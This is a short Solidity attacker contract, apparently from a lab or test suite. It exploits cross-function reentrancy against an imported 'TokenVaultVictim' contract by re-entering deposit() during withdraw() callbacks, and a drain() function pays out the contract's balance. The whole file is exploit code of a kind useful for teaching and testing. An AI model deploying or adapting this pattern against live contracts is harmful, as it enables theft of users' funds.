// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./TokenVaultVictim.sol";

/**
 * Attacker2_CrossFunc
 * Cross-function reentrancy: during withdraw() callback, re-enters deposit()
 * to inflate balance before withdraw() zeroes it.
 */
contract Attacker2_CrossFunc {
    TokenVaultVictim public target;
    bool public attacking;
    uint256 public reentryCount;
    uint256 constant MAX_REENTRY = 1;

    constructor(address _target) {
        target = TokenVaultVictim(payable(_target));
    }

    // Call with 1 ETH; contract must be pre-funded with >= 1 ETH for callback
    function attack() external payable {
        require(msg.value >= 1 ether, "need 1 ETH");
        target.deposit{value: 1 ether}();
        attacking = true;
        reentryCount = 0;
        target.withdraw(1 ether);
        attacking = false;
    }

    receive() external payable {
        if (attacking && reentryCount < MAX_REENTRY && address(this).balance >= 1 ether) {
            reentryCount++;
            // Re-enter deposit() — balance inflated while withdraw() hasn't zeroed yet
            target.deposit{value: 1 ether}();
        }
    }

    function drain() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
